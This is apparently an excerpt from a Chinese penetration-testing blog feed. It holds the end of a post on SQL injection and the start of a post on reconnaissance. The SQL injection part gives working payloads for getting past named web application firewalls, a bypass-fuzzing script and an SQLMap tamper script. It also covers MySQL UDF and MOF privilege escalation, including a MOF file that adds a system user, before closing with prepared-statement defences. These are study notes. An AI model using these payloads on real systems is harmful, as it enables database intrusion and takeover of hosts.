amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*/ union select null,table_name,null from INFOMATION_SCHEMA.tables</span><br></pre></td></tr></table></figure></p><h2 id="绕过360主机卫士"><a href="#绕过360主机卫士" class="headerlink" title="绕过360主机卫士"></a>绕过360主机卫士</h2><p>详细请参考<a href="https://www.t00ls.net/articles-45943.html" target="_blank" rel="noopener">Bypass 360主机卫士SQL注入防御（多姿势）</a></p><h3 id="利用默认白名单"><a href="#利用默认白名单" class="headerlink" title="利用默认白名单"></a>利用默认白名单</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/test.php/1.png?id=1 union select 1,2,schema_name from information_schema.SCHEMATA</span><br></pre></td></tr></table></figure><h3 id="利用静态资源"><a href="#利用静态资源" class="headerlink" title="利用静态资源"></a>利用静态资源</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/test.php/1.png?id=1 union select 1,2,schema_name from information_schema.SCHEMATA</span><br></pre></td></tr></table></figure><h3 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 and (select 1)=(Select 0xAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA) union select 1,2,schema_name from information_schema.SCHEMATA</span><br></pre></td></tr></table></figure><h3 id="URI参数溢出-1"><a href="#URI参数溢出-1" class="headerlink" title="URI参数溢出"></a>URI参数溢出</h3><p>同ngx_lua_waf</p><h3 id="GET-POST"><a href="#GET-POST" class="headerlink" title="GET+POST"></a>GET+POST</h3><p>提交POST请求时，忽略GET请求中的参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.204.132/sql.aspx?id=1 and 1=2 union select 1,column_name,3 from information_schema.columns</span><br><span class="line"></span><br><span class="line">POST：aaa</span><br></pre></td></tr></table></figure><h3 id="multipart-form-data"><a href="#multipart-form-data" class="headerlink" title="multipart/form-data"></a>multipart/form-data</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundaryACZoaLJJzUwc4hYM</span><br><span class="line">Content-Disposition: form-data; name=&quot;id&quot;</span><br><span class="line">1 union /*!select*/ 1,2,schema_name</span><br><span class="line">from information_schema.SCHEMATA</span><br><span class="line">------WebKitFormBoundaryACZoaLJJzUwc4hYM--</span><br></pre></td></tr></table></figure><h3 id="内联注释"><a href="#内联注释" class="headerlink" title="内联注释"></a>内联注释</h3><p>直接用fuzz脚本，结合注释、空格绕过和<code>/*!*/</code>进行绕过：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://test.com/index.php?id=1"</span></span><br><span class="line">Fuzz_a = [ <span class="string">'/*!'</span>, <span class="string">'*/'</span>, <span class="string">'/**/'</span>, <span class="string">'/'</span>, <span class="string">'?'</span>, <span class="string">'~'</span>, <span class="string">'!'</span>, <span class="string">'.'</span>, <span class="string">'%'</span>, <span class="string">'-'</span>, <span class="string">'*'</span>, <span class="string">'+'</span>, <span class="string">'='</span>]</span><br><span class="line">Fuzz_b = [<span class="string">''</span>]</span><br><span class="line">Fuzz_c = [<span class="string">'%0a'</span>, <span class="string">'%0b'</span>, <span class="string">'%0c'</span>, <span class="string">'%0d'</span>, <span class="string">'%0e'</span>, <span class="string">'%0f'</span>, <span class="string">'%0h'</span>, <span class="string">'%0i'</span>, <span class="string">'%0j'</span>]</span><br><span class="line">FUZZ = Fuzz_a + Fuzz_b + Fuzz_c</span><br><span class="line"><span class="comment"># 配置fuzz字典</span></span><br><span class="line">header = &#123; <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'</span>&#125;</span><br><span class="line">sql=<span class="string">'union select SCHEMA_NAME,2 from information_schema.SCHEMATA'</span></span><br><span class="line">sql_arr=<span class="string">"/*!&#123;&#125;*/#"</span>.format(sql).split()</span><br><span class="line"><span class="comment"># 设置请求的headers</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> FUZZ:</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> FUZZ:</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> FUZZ:</span><br><span class="line">            <span class="keyword">for</span> d <span class="keyword">in</span> FUZZ:</span><br><span class="line">                <span class="keyword">for</span> e <span class="keyword">in</span> FUZZ:</span><br><span class="line">                    fuzz_here=a + b + c + d + e</span><br><span class="line">                    <span class="comment"># RAW: PYLOAD = "/*!union" + fuzz_here + "select 1,2*/#"</span></span><br><span class="line">                    PYLOAD = fuzz_here.join(sql_arr)</span><br><span class="line">                    <span class="comment">#  exit(0)</span></span><br><span class="line">                    urlp = url + PYLOAD</span><br><span class="line">                    res = requests.get(urlp, headers=header)</span><br><span class="line">                    <span class="comment"># 使用for排列组合fuzz字典并请求页面, 因为组合后不一定符合sql语句，所以需要用正常页面特征做判断</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="string">'wait'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                        <span class="keyword">print</span> (<span class="string">"[*]URL:"</span> + urlp + <span class="string">u"过狗！"</span>)</span><br><span class="line">                        <span class="comment"># 如果返回的页面中包含wait字符，则打印并写出过狗payload。</span></span><br></pre></td></tr></table></figure><h2 id="绕过护卫神"><a href="#绕过护卫神" class="headerlink" title="绕过护卫神"></a>绕过护卫神</h2><p>详细请参考<a href="https://www.t00ls.net/articles-46165.html" target="_blank" rel="noopener">Bypass 护卫神SQL注入防御（多姿势）</a></p><h3 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h3><p>ASPX:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/sql.aspx?id=1%00and 1=2 union select 1,2,column_name from information_schema.columns</span><br></pre></td></tr></table></figure><p>PHP:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/sql.php?id=1/*%00*/union select 1,schema_name,3 from information_schema.schemata</span><br></pre></td></tr></table></figure><h3 id="Unicode编码"><a href="#Unicode编码" class="headerlink" title="Unicode编码"></a>Unicode编码</h3><p>适用于IIS服务器<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.204.132/sql.aspx?id=1 and 1=2 union s%u0045lect 1,2,column_name from information_schema.columns</span><br></pre></td></tr></table></figure></p><h3 id="HPP"><a href="#HPP" class="headerlink" title="HPP"></a>HPP</h3><p>ASPX中接受参数顺序为为GET，POST，COOKIE：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.204.132/sql.aspx?id=1 and 1=2 union/*</span><br><span class="line"></span><br><span class="line">POST：id=*/select 1,column_name,3 from information_schema.columns</span><br></pre></td></tr></table></figure><h3 id="号"><a href="#号" class="headerlink" title="%号"></a>%号</h3><p>IIS+ASP中解析会去掉%：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/sql.asp?id=1 and 1=2 un%ion select 1,2,column_name from information_schema.columns</span><br></pre></td></tr></table></figure><h3 id="缓冲区溢出-1"><a href="#缓冲区溢出-1" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h3><p>同360的缓冲区溢出，(Select 0xA*49099)。</p><h2 id="绕过安全狗"><a href="#绕过安全狗" class="headerlink" title="绕过安全狗"></a>绕过安全狗</h2><p>同360主机卫士的内联注释绕过</p><h2 id="分块传输"><a href="#分块传输" class="headerlink" title="分块传输"></a>分块传输</h2><p>详见<a href="https://anemone.top/HTTP-HTTP协议复习/">HTTP协议复习</a>分块传输部分</p><h2 id="SQLMap-Tamper写法"><a href="#SQLMap-Tamper写法" class="headerlink" title="SQLMap Tamper写法"></a>SQLMap Tamper写法</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"><span class="keyword">from</span> lib.core.settings <span class="keyword">import</span> UNICODE_ENCODING</span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span><span class="params">()</span>:</span></span><br><span class="line">  <span class="keyword">pass</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span><span class="params">(payload, **kwargs)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        payload=payload.replace(<span class="string">"UNION ALL SELECT"</span>,<span class="string">"union%23!@%23$%%5e%26%2a()%60~%0a/*!12345select*/"</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">"UNION SELECT"</span>,<span class="string">"union%23!@%23$%%5e%26%2a()%60~%0a/*!12345select*/"</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">" FROM "</span>,<span class="string">"/*!%23!@%23$%%5e%26%2a()%60~%0afrOm*/"</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">"CONCAT"</span>,<span class="string">"/*!12345CONCAT*/"</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">"CAST("</span>,<span class="string">"/*!12345CAST(*/"</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">"CASE"</span>,<span class="string">"/*!12345CASE*/"</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">"DATABASE()"</span>,<span class="string">"database/**/()"</span>)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure><h1 id="不同用户的权限"><a href="#不同用户的权限" class="headerlink" title="不同用户的权限"></a>不同用户的权限</h1><h2 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h2><p>普通用户有information_schema表的读权限，但没有mysql表的读权限</p><h2 id="MSSQL"><a href="#MSSQL" class="headerlink" title="MSSQL"></a>MSSQL</h2><p>很复杂，详细看<a href="https://paper.tuisec.win/detail/9146d3bd2335703" target="_blank" rel="noopener">深秋之夜360面试有感</a></p><h1 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h1><p>需要解除<code>secure-file-priv=</code><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">'文件内容'</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'文件路径'</span></span><br><span class="line"><span class="keyword">select</span> <span class="string">'文件内容'</span> <span class="keyword">into</span> <span class="keyword">dumpfile</span> <span class="string">'文件路径'</span></span><br></pre></td></tr></table></figure></p><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h2 id="用户自定义函数提权（UDF）"><a href="#用户自定义函数提权（UDF）" class="headerlink" title="用户自定义函数提权（UDF）"></a>用户自定义函数提权（UDF）</h2><h3 id="获取UDF-dll的hex编码"><a href="#获取UDF-dll的hex编码" class="headerlink" title="获取UDF.dll的hex编码"></a>获取UDF.dll的hex编码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select hex(load_file(%USER%\\Desktop\\udf.dll)) into dumpfile &apos;%USER%\\Desktop\\udf.txt&apos;;</span><br></pre></td></tr></table></figure><h3 id="保存udf-dll到目标主机"><a href="#保存udf-dll到目标主机" class="headerlink" title="保存udf.dll到目标主机"></a>保存udf.dll到目标主机</h3><p>若数据库版本为5.0以下将其保存到<code>C:\Windows\</code>或<code>C:\Windows\System32\</code>，否则保存到<code>@@basedir\lib\plugin\</code></p><p>使用<code>select &#39;xxx&#39; into dumpfile &#39;C:/MySQL/lib/plugin/::$INDEX_ALLOCATION&#39;;</code>新建文件夹(这里我没成功，网上说确实不成功)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE Temp_udf(udf BLOB);</span><br><span class="line">INSERT into Temp_udf values (unhex(&apos;$shellcode&apos;));   #$shellcode为hex(udf.dll)</span><br><span class="line">SELECT udf FROM Temp_udf INTO DUMPFILE &apos;C:/MySQL/lib/plugin/udf.dll&apos;;</span><br></pre></td></tr></table></figure><h3 id="使用用户函数提权"><a href="#使用用户函数提权" class="headerlink" title="使用用户函数提权"></a>使用用户函数提权</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">create function cmdshell returns string soname &apos;udf.dll&apos;;  #此处不能填绝对路径 只能是dll名</span><br><span class="line">select * from mysql.func;                  #看看cmdshell function是否创立，创立就继续</span><br><span class="line">select hex(cmdshell(&apos;whoami&apos;));            #运行各种命令提权</span><br></pre></td></tr></table></figure><h2 id="mof提权"><a href="#mof提权" class="headerlink" title="mof提权"></a>mof提权</h2><p>由于<strong>c:/windows/system32/wbem/mof/</strong>目录下的 <strong>nullevt.mof</strong> 文件，每分钟都会在一个特定的时间去执行一次，因此可以使用dumpfile将shell写入，然后由系统执行（有点像linux的crontab）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#pragma namespace(&quot;\\\\.\\root\\subscription&quot;)</span><br><span class="line"> </span><br><span class="line">instance of __EventFilter as $EventFilter</span><br><span class="line">&#123;</span><br><span class="line">    EventNamespace = &quot;Root\\Cimv2&quot;;</span><br><span class="line">    Name  = &quot;filtP2&quot;;</span><br><span class="line">    Query = &quot;Select * From __InstanceModificationEvent &quot;</span><br><span class="line">            &quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;</span><br><span class="line">            &quot;And TargetInstance.Second = 5&quot;;</span><br><span class="line">    QueryLanguage = &quot;WQL&quot;;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer</span><br><span class="line">&#123;</span><br><span class="line">    Name = &quot;consPCSV2&quot;;</span><br><span class="line">    ScriptingEngine = &quot;JScript&quot;;</span><br><span class="line">    ScriptText =</span><br><span class="line">&quot;var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user anemone /add\&quot;)&quot;;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line">instance of __FilterToConsumerBinding</span><br><span class="line">&#123;</span><br><span class="line">    Consumer   = $Consumer;</span><br><span class="line">    Filter = $EventFilter;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>上传之后用mysql写文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&apos;c:/www/nullevt.mof&apos;) into dumpfile &apos;c:/windows/system32/wbem/mof/nullevt.mof&apos;</span><br></pre></td></tr></table></figure><h1 id="防御——使用预编译语句"><a href="#防御——使用预编译语句" class="headerlink" title="防御——使用预编译语句"></a>防御——使用预编译语句</h1><p>预先编译sql，后面的注入语句只能做普通字符串查询，预编译语句不能用于orderby</p><p>SQL写法：</p><ol><li><p>预编译</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">prepare ins from &apos;insert into t select ?,?&apos;;</span><br></pre></td></tr></table></figure></li><li><p>执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set @a=999,@b=&apos;hello&apos;;</span><br><span class="line">execute ins using @a,@b;</span><br><span class="line">select * from t;</span><br></pre></td></tr></table></figure></li><li><p>释放</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">deallocate prepare ins;</span><br></pre></td></tr></table></figure></li></ol><p>三次交互：</p><p><img src="/sqli-SQL注入总结/1551840783777.png" alt="1551840783777"></p><p>Python写法，python并不支持MySQL的预编译语句（第三方库oursql支持），只是将字符串转义后放到数据库查询：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cursor.execute(<span class="string">'insert into user (name,password) value (%s,%s)'</span>,(name,password))</span><br></pre></td></tr></table></figure><p>Java写法，需要开启预编译功能（useServerPrepStmts=true），程序与数据库3次交互prepare-&gt;execute-&gt;close stmt</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    Class.forName(name);<span class="comment">//指定连接类型</span></span><br><span class="line">    conn = DriverManager.getConnection(url, user, password);<span class="comment">//获取连接</span></span><br><span class="line">    pst = conn.prepareStatement(<span class="string">"SELECT * FROM users WHERE `name`=?"</span>);<span class="comment">//准备执行语句</span></span><br><span class="line">    pst.setString(<span class="number">1</span>,<span class="string">"9ian1i"</span>);</span><br><span class="line">    rs = pst.executeQuery();</span><br><span class="line">    <span class="keyword">while</span> (rs.next())&#123;</span><br><span class="line">        String name = rs.getString(<span class="string">"name"</span>);</span><br><span class="line">        System.out.println(name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>php写法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$name=$_GET[<span class="string">'name'</span>];</span><br><span class="line">$mysqli = <span class="keyword">new</span> mysqli(<span class="string">'127.0.0.1'</span>,<span class="string">'root'</span>,<span class="string">'root'</span>,<span class="string">'test'</span>);</span><br><span class="line">$mysqli_stmt=$mysqli-&gt;prepare(<span class="string">"select username, password from test where username=?"</span>);</span><br><span class="line">$mysqli_stmt-&gt;bind_param(<span class="string">'s'</span>, $name);</span><br><span class="line">$mysqli_stmt-&gt;execute();</span><br><span class="line">$mysqli_stmt-&gt;bind_result($username, $password);</span><br><span class="line"><span class="keyword">while</span>($mysqli_stmt-&gt;fetch())&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"$username--$password"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li><p>十种MySQL报错注入，<a href="https://www.cnblogs.com/xishaonian/p/6102750.html" target="_blank" rel="noopener">https://www.cnblogs.com/xishaonian/p/6102750.html</a></p></li><li><p>深入探究宽字节注入漏洞与修补原理，<a href="https://blog.csdn.net/qq_29419013/article/details/81205291" target="_blank" rel="noopener">https://blog.csdn.net/qq_29419013/article/details/81205291</a> </p></li><li><p>Bypass ngx_lua_waf SQL注入防御（多姿势），<a href="https://www.t00ls.net/articles-45736.html" target="_blank" rel="noopener">https://www.t00ls.net/articles-45736.html</a></p></li><li><p>Bypass 360主机卫士SQL注入防御（多姿势），<a href="https://www.t00ls.net/articles-45943.html" target="_blank" rel="noopener">https://www.t00ls.net/articles-45943.html</a></p></li><li><p>Bypass 护卫神SQL注入防御（多姿势），<a href="https://www.t00ls.net/articles-46165.html" target="_blank" rel="noopener">https://www.t00ls.net/articles-46165.html</a> </p></li><li><p>深秋之夜360面试有感，<a href="https://paper.tuisec.win/detail/9146d3bd2335703" target="_blank" rel="noopener">https://paper.tuisec.win/detail/9146d3bd2335703</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Web安全-SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
            <tag> 注入 </tag>
            
            <tag> waf绕过 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息收集思路整理</title>
      <link href="/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%80%9D%E8%B7%AF%E6%95%B4%E7%90%86/"/>
      <url>/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%80%9D%E8%B7%AF%E6%95%B4%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p>信息收集是渗透测试的第一步，本文总结目前信息收集的具体操作步骤。</p><h1 id="网站信息"><a href="#网站信息" class="headerlink" title="网站信息"></a>网站信息</h1><h2 id="whois信息"><a href="#whois信息" class="headerlink" title="whois信息"></a>whois信息</h2><p>可以收集到的信息有：</p><ul><li>联系人</li><li>邮箱（可以到社工库进一步查询）</li><li>电话</li></ul><p>收集途径有：</p><ul><li><a href="http://whois.chinaz.com/" target="_blank" rel="noopener">http://whois.chinaz.com/</a> （站长之家）</li><li><a href="https://who.is/" target="_blank" rel="noopener">https://who.is/</a> （国外）</li><li><a href="https://x.threatbook.cn/（通过邮箱查询其他的站点）" target="_blank" rel="noopener">https://x.threatbook.cn/（通过邮箱查询其他的站点）</a></li><li><a href="https://dns.aizhan.com/" target="_blank" rel="noopener">https://dns.aizhan.com/</a> （IP反查域名）</li><li>命令<code>whois anemone.top</code> </li></ul><a id="more"></a><h2 id="备案信息"><a href="#备案信息" class="headerlink" title="备案信息"></a>备案信息</h2><p>仍然是收集联系人、公司等信息</p><p>途径有：</p><ul><li><a href="https://www.tianyancha.com/brand/b59c12209" target="_blank" rel="noopener">https://www.tianyancha.com/brand/b59c12209</a> （天眼查）</li><li><a href="http://www.gsxt.gov.cn（国家信用公示）" target="_blank" rel="noopener">http://www.gsxt.gov.cn（国家信用公示）</a></li><li><a href="http://icp.chinaz.com（站长之家，可以查询其他备案站点）" target="_blank" rel="noopener">http://icp.chinaz.com（站长之家，可以查询其他备案站点）</a></li></ul><h2 id="DNS信息"><a href="#DNS信息" class="headerlink" title="DNS信息"></a>DNS信息</h2><p>DNS用来获取网站IP，但若网站使用了CDN服务则无效。</p><ul><li><code>dig anemone.top</code> # Linux</li><li><code>dig @1.1.1.1 anemone.top</code> # 使用1.1.1.1dns解析</li><li><code>nslookup anemone.top</code> # Windows</li></ul><h2 id="指纹信息"><a href="#指纹信息" class="headerlink" title="指纹信息"></a>指纹信息</h2><p>获取中间件类型和版本，通过http头部获取，也可以用whatweb工具：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ whatweb anemone.top</span><br></pre></td></tr></table></figure><p>根据目录、头文件、特有文件等识别CMS：</p><ul><li><a href="http://www.yunsee.cn/finger.html" target="_blank" rel="noopener">http://www.yunsee.cn/finger.html</a></li><li><a href="http://whatweb.bugscaner.com/look/" target="_blank" rel="noopener">http://whatweb.bugscaner.com/look/</a></li><li><a href="https://www.test404.com/post-1618.html" target="_blank" rel="noopener">Test404轻量CMS指纹识别</a> </li><li><code>nmap -p80,443 --script=http-waf-fingerprint ip</code></li><li><code>nmap -p80,443 --script=http-waf-fingerprint ip</code></li></ul><h1 id="服务器的相关信息"><a href="#服务器的相关信息" class="headerlink" title="服务器的相关信息"></a>服务器的相关信息</h1><h2 id="寻找真实IP"><a href="#寻找真实IP" class="headerlink" title="寻找真实IP"></a>寻找真实IP</h2><p>先用多地ping判断网站是否存在CDN：</p><ul><li><a href="http://tool.chinaz.com/dns/" target="_blank" rel="noopener">http://tool.chinaz.com/dns/</a></li></ul><p>若存在CDN则尝试如下办法寻找真实IP：</p><ul><li>分站域名</li><li><p>DNS历史记录</p><ul><li><a href="https://securitytrails.com/" target="_blank" rel="noopener">https://securitytrails.com/</a></li><li><a href="https://x.threatbook.cn/" target="_blank" rel="noopener">https://x.threatbook.cn/</a></li></ul><ul><li><a href="https://www.virustotal.com/#/home/search" target="_blank" rel="noopener">VirusTotal</a></li></ul></li><li><p>上传附件</p></li><li><p>国外DNS：利用国内网站不在国外做CDN的特点，使用国外的DNS解析，感谢”<a href="https://www.freebuf.com/articles/web/179043.html" target="_blank" rel="noopener">经验分享｜谈谈渗透测试中的信息搜集</a>“提供了以下冷门的DNS：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">209.244.0.3</span><br><span class="line">64.6.64.6</span><br><span class="line">8.8.8.8</span><br><span class="line">9.9.9.9</span><br><span class="line">8.26.56.26</span><br><span class="line">199.85.126.10</span><br><span class="line">208.67.222.222</span><br><span class="line">195.46.39.39</span><br><span class="line">69.195.152.204</span><br><span class="line">208.76.50.50</span><br><span class="line">216.146.35.35</span><br><span class="line">37.235.1.174</span><br><span class="line">198.101.242.72</span><br><span class="line">77.88.8.8</span><br><span class="line">91.239.100.100</span><br><span class="line">74.82.42.42</span><br><span class="line">109.69.8.51</span><br><span class="line">156.154.70.1</span><br><span class="line">1.1.1.1</span><br><span class="line">45.77.165.194</span><br></pre></td></tr></table></figure></li><li><p>邮箱：邮件服务器无法CDN，因此可以使用网站的邮件发送功能（如密码找回等）获取原IP，当然要确保网站的邮件服务器用的是自己的。</p></li><li><p>全网扫描：最笨的办法是使用工具扫描全网的IP段：</p><ul><li>zmap，<a href="https://github.com/zmap/zgrab" target="_blank" rel="noopener">zgrab</a>(<a href="https://www.t00ls.net/articles-40631.html" target="_blank" rel="noopener">https://www.t00ls.net/articles-40631.html</a>)</li><li>fuckcdn.exe</li><li>w8Fuckcdn</li></ul></li><li><p>网站漏洞，如：</p><ul><li>SSRF</li><li>phpinfo</li></ul></li></ul><h2 id="服务器系统"><a href="#服务器系统" class="headerlink" title="服务器系统"></a>服务器系统</h2><ul><li>网址大小写是否敏感判断Windows/Linux</li><li>nmap识别系统</li></ul><h2 id="开放端口"><a href="#开放端口" 